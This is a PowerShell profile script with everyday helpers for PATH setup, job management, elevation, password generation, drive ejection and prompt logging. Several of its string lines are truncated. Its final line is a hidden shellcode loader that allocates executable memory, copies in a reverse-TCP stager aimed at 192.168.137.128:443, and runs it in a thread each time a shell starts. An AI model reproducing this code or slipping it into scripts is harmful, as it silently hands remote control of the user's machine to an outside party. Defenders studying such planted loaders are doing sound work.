


c:
cd\


Get-ChildItem -Path $PSScriptRoot\*.ps1 | ? name -NotMatch 'Microsoft.PowerShell_profile' | Foreach-Object { . $_.FullName }

$env:path = @(
    $env:path
    'C:\Program Files (x86)\Notepad++\'
    'C:\Users\admin\AppData\Local\GitHub\PortableGit_c7e0cbde92ba565cb218a521411d0e854079a28c\cmd'
    'C:\Users\admin\AppData\Local\GitHub\PortableGit_c7e0cbde92ba565cb218a521411d0e854079a28c\usr\bin'
    'C:\Users\admin\AppData\Local\GitHub\PortableGit_c7e0cbde92ba565cb218a521411d0e854079a28c\usr\share\git-tfs'
    'C:\Users\admin\AppData\Local\Apps\2.0\C31EKMVW.15A\TWAQ6XY3.BAX\gith..tion_317444273a93ac29_0003.0000_328216539257acd4'
    'C:\Users\admin\AppData\Local\GitHub\lfs-amd64_1.1.0;C:\WINDOWS\Microsoft.NET\Framework\v4.0.30319'
) -join ';'


Update-TypeData "$PSScriptRoot\My.Types.Ps1xml"


function Out-Default {
    if ($input.GetType().ToString() -ne 'System.Management.Automation.ErrorRecord') {
        try {
            $input | Tee-Object -Variable global:lastobject | Microsoft.PowerShell.Core\Out-Default
        } catch {
            $input | Microsoft.PowerShell.Core\Out-Default
        }
    } else {
        $input | Microsoft.PowerShell.Core\Out-Default
    }
}

function gj { Get-Job | select id, name, state | ft -a }
function sj ($id = '*') { Get-Job $id | Stop-Job; gj }
function rj { Get-Job | ? state -match 'comp' | Remove-Job }


function Test-Administrator {  
    $user = [Security.Principal.WindowsIdentity]::GetCurrent()
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}
function Start-PsElevatedSession { 
    
    if (!(Test-Administrator)) {
        if ($host.Name -match 'ISE') {
            start PowerShell_ISE.exe -Verb runas
        } else {
            start powershell -Verb runas -ArgumentList $('-noexit ' + ($args | Out-String))
        }
    } else {
        Write-Warning 'Session is already elevated'
    }
} 
Set-Alias -Name su -Value Start-PsElevatedSession


function Elevate-Process {
    $file, [string]$arguments = $args
    $psi = new-object System.Diagnostics.ProcessStartInfo $file
    $psi.Arguments = $arguments
    $psi.Verb = 'runas'

    $psi.WorkingDirectory = Get-Location
    [System.Diagnostics.Process]::Start($psi)
}
Set-Alias sudo Elevate-Process


function Get-Excuse {
    (Invoke-WebRequest http://pages.cs.wisc.edu/~ballard/bofh/excuses -OutVariable excuses).content.split([Environment]::NewLine)[(get-random $excuses.content.split([Environment]::NewLine).count)]
}

function fourdigitpw {
    $fpw = 1111
    while ($fpw -split '' | ? {$_} | group | ? count -gt 1) {
        $fpw = -join(1..4 | % {Get-Random -Minimum 0 -Maximum 10})
    }
    $fpw
}





function rpw {
    $pw = ''
    while (($pw -split '' | ? {$_} | group).count -ne 8) {
        $pw = -join$($([char](65..90|Get-Random));$(1..3|%{[char](97..122|Get-Random)});$(1..4|%{0..9|Get-Random}))
    }
    $pw
}


function ej ([switch]$more) {
    $count = 0
    if ($more) {
        $drives = [io.driveinfo]::getdrives() | ? {$_.drivetype -notmatch 'Network' -and !(dir $_.name users -ea 0)}
    } else {
        $drives = [io.driveinfo]::getdrives() | ? {$_.drivetype -match 'Removable' -and $_.driveformat -match 'fat32'}
    }
    if ($drives) {
        write-host $($drives | select name, volumelabel, drivetype, driveformat, totalsize | ft -a | out-string)
        $letter = Read-Host "Drive letter ($(if ($drives.count -eq 1) {$drives} else {'?'}))"
        if (!$letter) {$letter = $drives.name[0]}
        $eject = New-Object -ComObject Shell.Application
        $eject.Namespace(17).ParseName($($drives | ? name -Match $letter)).InvokeVerb('Eject')
    }
}


function py { . C:\Users\admin\AppData\Local\Programs\Python\Python35-32\python.exe }








$PSLogPath = ("{0}\Documents\WindowsPowerShell\log\{1:yyyyMMdd}-{2}.log" -f $env:USERPROFILE, (Get-Date), $PID)
if (!(Test-Path $(Split-Path $PSLogPath))) { md $(Split-Path $PSLogPath) }
Add-Content -Value "
Add-Content -Value "
function prompt {
    
    $LastCmd = Get-History -Count 1
    if ($LastCmd) {
        $lastId = $LastCmd.Id
        Add-Content -Value "
        Add-Content -Value "$($LastCmd.CommandLine)" -Path $PSLogPath
        Add-Content -Value '' -Path $PSLogPath
        $howlongwasthat = $LastCmd.EndExecutionTime.Subtract($LastCmd.StartExecutionTime).TotalSeconds
    }
    
    
    
    $MajorVersion = $PSVersionTable.PSVersion.Major
    $MinorVersion = $PSVersionTable.PSVersion.Minor

    
    if ([System.IntPtr]::Size -eq 8) {
        $ShellBits = 'x64 (64-bit)'
    } elseif ([System.IntPtr]::Size -eq 4) {
        $ShellBits = 'x86 (32-bit)'
    }

    
    $host.UI.RawUI.WindowTitle = "PowerShell v$MajorVersion.$MinorVersion $ShellBits | $env:USERNAME@$env:USERDNSDOMAIN | $env:COMPUTERNAME | $env:LOGONSERVER"

    
    Write-Host(Get-Date -UFormat "%Y/%m/%d %H:%M:%S ($howlongwasthat) | ") -NoNewline -ForegroundColor DarkGreen
    Write-Host(Get-Location) -ForegroundColor DarkGreen

    
    
    if (Test-Administrator) {
        Write-Host '
    } else {        
        Write-Host '
    }
    Write-Host '»' -NoNewLine -ForeGroundColor Green
    ' ' 
} 



function lunch {
    sleep 3000
    Write-Host •
    MessageBox clock in
}



function wimi {
    ((iwr http://www.realip.info/api/p/realip.php).content | ConvertFrom-Json).IP
}


function java {
    param (
        [switch]$download
    )
    
    if ($download) {
        $page = iwr http://java.com/en/download/windows_offline.jsp
        $version = $page.RawContent -split "`n" | ? {$_ -match 'recommend'} | select -f 1 | % {$_ -replace '^[^v]+| \(.*$'}
        $link = $page.links.href | ? {$_ -match '^http.*download'} | select -f 1
        iwr $link -OutFile "c:\temp\Java $version.exe"
    } else {
        $(iwr http://java.com/en/download).Content.Split("`n") | ? {$_ -match 'version'} | select -f 1
    }
}







$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x89,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

